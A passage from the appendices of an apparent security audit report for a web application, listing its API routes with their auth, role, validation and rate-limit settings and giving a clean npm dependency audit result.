|--------|------|------|------|------------|--------------|
| GET | /projects | No | — | query params | globalLimiter |
| GET | /projects/featured | No | — | — | globalLimiter |
| GET | /projects/:id | No | — | — | globalLimiter |
| GET | /projects/:id/media | No | — | — | globalLimiter |
| GET | /projects/:id/sections | No | — | — | globalLimiter |
| GET | /projects/:id/videos | No | — | — | globalLimiter |
| POST | /projects | Yes | admin/mod | title, description, category, year, tools | globalLimiter |
| PUT | /projects/:id | Yes | admin/mod | same as POST | globalLimiter |
| PATCH | /projects/:id | Yes | admin/mod | same as POST | globalLimiter |
| POST | /projects/:id/media | Yes | admin/mod | file (multipart) | globalLimiter |
| PATCH | /projects/:id/media/reorder | Yes | admin/mod | ordered array | globalLimiter |
| PATCH | /projects/:id/media/:mediaId | Yes | admin/mod | title, alt | globalLimiter |
| PATCH | /projects/:id/cover | Yes | admin/mod | mediaId | globalLimiter |
| POST | /projects/:id/sections | Yes | admin/mod | title, content, order | globalLimiter |
| PATCH | /projects/:id/sections/reorder | Yes | admin/mod | ordered array | globalLimiter |
| PATCH | /projects/:id/sections/:sectionId | Yes | admin/mod | title, content, order | globalLimiter |
| POST | /projects/:id/videos | Yes | admin/mod | file or { url, title } | globalLimiter |
| PATCH | /projects/:id/videos/reorder | Yes | admin/mod | ordered array | globalLimiter |
| PATCH | /projects/:id/videos/position | Yes | admin/mod | position | globalLimiter |
| PATCH | /projects/:id/videos/:videoId | Yes | admin/mod | title, youtube_id | globalLimiter |
| DELETE | /projects/:id | Yes | admin/mod | — | globalLimiter |
| DELETE | /projects/:id/media/:mediaId | Yes | admin/mod | — | globalLimiter |
| DELETE | /projects/:id/sections/:sectionId | Yes | admin/mod | — | globalLimiter |
| DELETE | /projects/:id/videos | Yes | admin/mod | — | globalLimiter |
| DELETE | /projects/:id/videos/:videoId | Yes | admin/mod | — | globalLimiter |

### News Routes (`/api/news`)

| Method | Path | Auth | Role | Validation | Rate Limited |
|--------|------|------|------|------------|--------------|
| GET | /news | No | — | query params | globalLimiter |
| GET | /news/featured | No | — | — | globalLimiter |
| GET | /news/:slug | No | — | — | globalLimiter |
| POST | /news | Yes | admin/mod | title, body, category, cover_image | globalLimiter |
| PUT | /news/:id | Yes | admin/mod | same as POST | globalLimiter |
| PATCH | /news/:id | Yes | admin/mod | same as POST | globalLimiter |
| DELETE | /news/:id | Yes | admin/mod | — | globalLimiter |

### Party Routes (`/api/party`)

| Method | Path | Auth | Role | Validation | Rate Limited |
|--------|------|------|------|------------|--------------|
| GET | /party | Yes | party_access | — | globalLimiter |
| GET | /party/rsvp | Yes | party_access | — | globalLimiter |
| POST | /party/rsvp | Yes | party_access | name, attendance, answers | globalLimiter |
| PUT | /party/rsvp | Yes | party_access | name, attendance, answers | globalLimiter |
| GET | /party/photos | Yes | party_access | — | globalLimiter |
| POST | /party/photos | Yes | party_access | file (multipart) ⚠️ | globalLimiter |
| DELETE | /party/photos/:id | Yes | admin | — | globalLimiter |

### Admin Routes (`/api/admin`)

| Method | Path | Auth | Role | Validation | Rate Limited |
|--------|------|------|------|------------|--------------|
| GET | /admin/users | Yes | admin | pagination query | globalLimiter |
| GET | /admin/users/:id | Yes | admin | — | globalLimiter |
| PATCH | /admin/users/:id | Yes | admin | role, verified, party_access | globalLimiter |
| DELETE | /admin/users/:id | Yes | admin | — | globalLimiter |

### Contact Routes (`/api/contact`)

| Method | Path | Auth | Role | Validation | Rate Limited |
|--------|------|------|------|------------|--------------|
| POST | /contact | No | — | name, email, message | globalLimiter |

### Content Routes (`/api/content`)

| Method | Path | Auth | Role | Validation | Rate Limited |
|--------|------|------|------|------------|--------------|
| POST | /content/upload | Yes | admin/mod | file (multipart) ⚠️ | globalLimiter |

### Upload / Media Routes (`/api/uploads`)

| Method | Path | Auth | Role | Validation | Rate Limited |
|--------|------|------|------|------------|--------------|
| GET | /uploads/* | No | — | static file serve | — (express.static) |

### Observability / Metrics

| Method | Path | Auth | Role | Validation | Rate Limited |
|--------|------|------|------|------------|--------------|
| GET | /metrics | No* | — | — | globalLimiter |
| GET | /health | No | — | — | — |

*Prometheus `/metrics` should be restricted to internal/scraper IPs if not already firewalled at the infrastructure level.

⚠️ = finding associated with this route

---

## Appendix B — Dependency Audit

Run: `npm audit --production` (2026-04-16)

```
found 0 vulnerabilities
```

The `path-to-regexp` ReDoS vulnerability identified in the March 30, 2026 audit has been resolved via `npm audit fix`. No production dependency vulnerabilities are currently present.

**Note:** Run `npm audit --production` before each deployment to catch newly disclosed vulnerabilities.

---

*End of report. Generated 2026-04-16 by static code analysis. Findings reflect the state of the codebase in the `claude/frosty-kilby` branch.*
